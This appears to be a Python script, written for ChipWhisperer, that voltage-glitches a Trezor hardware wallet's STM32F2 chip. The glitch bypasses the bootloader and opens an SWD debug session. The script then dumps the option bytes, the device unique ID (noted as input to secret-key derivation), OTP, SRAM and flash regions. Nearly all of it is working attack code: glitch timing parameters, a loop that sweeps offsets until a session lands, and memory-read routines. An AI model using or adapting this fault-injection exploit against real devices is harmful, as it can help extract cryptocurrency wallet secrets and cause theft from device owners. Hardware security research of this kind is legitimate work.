#!/usr/bin/env python3
"""
Bootloader-bypass glitch, then sweep every readable region to pull as much
info off the Trezor as possible and sanity-check whether reads are real.

Oracle for a live session: DBGMCU_IDCODE (0xE0042000) reads 0x200F6411
(STM32F2, DEV_ID 0x411) -- that register is real silicon, so if it comes back
correct the SWD session is genuine and any zeros elsewhere are real content,
not a bogus read.

Crowbar torn down on exit. Non-interactive.
"""
import os, sys, time, signal, atexit
import chipwhisperer as cw

EXT_OFFSET   = int(os.environ.get("EXT_OFFSET", 17000))
EXT_SPAN     = int(os.environ.get("EXT_SPAN", 2))
MAX_ATTEMPTS = int(os.environ.get("MAX_ATTEMPTS", 80))
DBGMCU       = 0xE0042000
EXPECT       = 0x200F6411

# address, length, label, note
TARGETS = [
    (0xE0042000, 4,  "DBGMCU_IDCODE",  "expect 0x200F6411 (STM32F2)"),
    (0xE000ED00, 4,  "SCB CPUID",      "Cortex-M3 core id"),
    (0x40023C14, 4,  "FLASH_OPTCR",    "RDP level is bits 15:8"),
    (0x1FFF7A22, 2,  "Flash size reg", "KB of flash"),
    (0x1FFF7A10, 12, "Unique ID",      "96-bit device id (SEK input)"),
    (0x1FFF7800, 32, "OTP block 0",    "one-time programmable"),
    (0x20000000, 64, "SRAM start",     "runtime data"),
    (0x20008000, 64, "SRAM +32K",      "runtime data"),
    (0x2001FF80, 64, "SRAM top",       "stack region"),
    (0x08000000, 32, "Flash bootldr",  "vector table (RDP locked?)"),
    (0x08010000, 48, "Flash fw header","TRZF magic + version (RDP locked?)"),
    (0x1FFFC000, 16, "Option bytes",   "RDP / write protect"),
]

def usb_reset_stlink():
    os.system("/home/tdaly/.cwvenv/usb_reset > /dev/null 2>&1")

scope = cw.scope()
scope.io.target_pwr = "high_z"
scope.clock.clkgen_freq  = 100e6
scope.trigger.triggers   = "tio4"
scope.glitch.clk_src     = "clkgen"
scope.glitch.output      = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True
scope.glitch.repeat = 20
scope.glitch.width  = 40
scope.glitch.offset = -45

def reboot_flush():
    scope.io.target_pwr = False
    scope.io.nrst = False
    scope.arm()
    scope.io.nrst = "high_z"
    scope.io.target_pwr = True

_torn = False
def teardown(*_):
    global _torn
    if _torn: return
    _torn = True
    for a, v in (("glitch_hp", False), ("glitch_lp", False),
                 ("target_pwr", False), ("nrst", "high_z")):
        try: setattr(scope.io, a, v)
        except Exception: pass
    try: scope.dis()
    except Exception: pass
atexit.register(teardown)
def _sig(*_):
    print("\n⚠ interrupt -> teardown"); teardown(); sys.exit(0)
signal.signal(signal.SIGINT, _sig)
signal.signal(signal.SIGTERM, _sig)

def land_session(eo):
    """Fire glitch, return a live swd dev if DBGMCU reads correctly."""
    scope.glitch.ext_offset = eo
    reboot_flush()
    time.sleep(2)
    scope.io.glitch_hp = False; scope.io.glitch_hp = True
    scope.io.glitch_lp = False; scope.io.glitch_lp = True
    try:
        import swd
        usb_reset_stlink(); time.sleep(0.4)
        dev = swd.Swd()
        val = int.from_bytes(bytes(dev.read_mem(DBGMCU, 4)), "little")
        if val == EXPECT:
            return dev, val
        return dev, val   # session up but unexpected id -> still report
    except Exception:
        return None, None

def hexdump(data, base):
    out = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hexs = " ".join(f"{b:02X}" for b in chunk)
        asc  = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"    {base+i:08X}: {hexs:<47}  |{asc}|")
    return "\n".join(out)

print("=" * 64)
print("Bootloader-bypass glitch -> full info sweep")
print(f"  ext_offset {EXT_OFFSET}..{EXT_OFFSET+EXT_SPAN}, up to {MAX_ATTEMPTS} attempts")
print("=" * 64)

reboot_flush()
dev = None
attempt = 0
while attempt < MAX_ATTEMPTS and dev is None:
    for eo in range(EXT_OFFSET, EXT_OFFSET + EXT_SPAN + 1):
        attempt += 1
        dev, val = land_session(eo)
        if dev is not None:
            tag = "OK" if val == EXPECT else f"session up, DBGMCU=0x{val:08X}"
            print(f"\n💥 session landed @ ext_offset={eo} attempt {attempt}  ({tag})")
            break
        print(f"  attempt {attempt:3d} eo={eo} -> no session", flush=True)
        if attempt >= MAX_ATTEMPTS:
            break
        time.sleep(0.1)

if dev is None:
    print("\nNo live session landed. Re-run / raise MAX_ATTEMPTS.")
    sys.exit(0)

print("\n" + "=" * 64)
print("INFO SWEEP")
print("=" * 64)
for addr, length, label, note in TARGETS:
    try:
        data = bytes(dev.read_mem(addr, length))
        allz = all(b == 0 for b in data)
        allf = all(b == 0xFF for b in data)
        flag = "  [all zero]" if allz else ("  [all FF]" if allf else "")
        print(f"\n[{label}] 0x{addr:08X} ({note}){flag}")
        if length <= 4:
            print(f"    value = 0x{int.from_bytes(data,'little'):0{length*2}X}")
        print(hexdump(data, addr))
    except Exception as e:
        print(f"\n[{label}] 0x{addr:08X} ({note})")
        print(f"    FAULT: {str(e)[:60] or '(empty error)'}")

# scan a fuller SRAM range for ANY non-zero island
print("\n" + "=" * 64)
print("SRAM non-zero scan (0x20000000..0x20020000, 1K windows)")
print("=" * 64)
nonzero = 0
for addr in range(0x20000000, 0x20020000, 1024):
    try:
        d = bytes(dev.read_mem(addr, 256))
        n = sum(1 for b in d if b not in (0, 0xFF))
        if n:
            nonzero += 1
            print(f"  0x{addr:08X}: {n}/256 non-trivial  first={d[:16].hex()}")
    except Exception:
        print(f"  0x{addr:08X}: read fault")
        break
if nonzero == 0:
    print("  SRAM is entirely zero/FF -> firmware never ran far enough to populate it.")
